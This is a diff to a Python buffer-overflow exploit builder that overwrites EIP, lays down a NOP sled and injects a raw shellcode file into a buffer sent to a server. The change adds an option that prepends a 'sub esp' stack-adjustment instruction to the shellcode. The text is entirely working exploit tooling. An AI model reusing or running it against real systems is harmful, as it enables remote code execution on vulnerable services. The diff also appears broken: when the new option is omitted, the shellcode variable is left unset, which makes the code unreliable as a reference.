@@ -27,6 +27,7 @@ exploit_parser.add_argument('--offsetEIP',type=int,help='how many bytes to write
 exploit_parser.add_argument('--eip',type=str,help='memory location to overwrite EIP',required=True)
 exploit_parser.add_argument('--shellcode',type=str,help='path to shellcode in raw binary form',required=True)
 exploit_parser.add_argument('--shellcodeOffset',type=int,help='offset to begin shellcode',required=True)
+exploit_parser.add_argument('--sub_esp',type=int,help='integer value to (1-9) of how many kilobytes to subtract from ESP')
 exploit_parser.add_argument('--nops',type=int,help='offset to begin shellcode')
 exploit_parser.add_argument('--command',type=str,help='server command to prepend buffer with')
 
@@ -66,6 +67,9 @@ if __name__ == '__main__':
 	elif(args.cmdlet=='exploit'):
 		print('exploit')
 
+		stack_adjust = b'\x81\xec\x00'
+		zeros = b'\x00\x00'
+
 		nop = b'\x90'
 
 		#check nops
@@ -89,8 +93,21 @@ if __name__ == '__main__':
 			sys.exit(1)
 		else:
 			shellcode_file = open(args.shellcode,'rb')
-			shellcode = shellcode_file.read()
+			shellcode1 = shellcode_file.read()
 			shellcode_file.close()
+
+
+		if(args.sub_esp == None):
+			pass
+		else:
+			if(args.sub_esp < 1 or args.sub_esp > 9):
+				print('enter sub esp value between 1 and 9 (kB to subtract from stack pointer)')
+				sys.exit(1)
+			val = bytes.fromhex('{}'.format(args.sub_esp*10))
+			stack_adjust += val + zeros
+			_tmp = stack_adjust + shellcode1
+			shellcode = _tmp
+
 
 		if(args.offsetEIP + 4 == args.shellcodeOffset):
 			buffer += b'A'*args.offsetEIP + eip + b'A'*(args.offsetEIP - args.shellcodeOffset + 4) + nop*nops + shellcode + b'A'*(args.len - args.offsetEIP - 4 - len(shellcode)-nops)
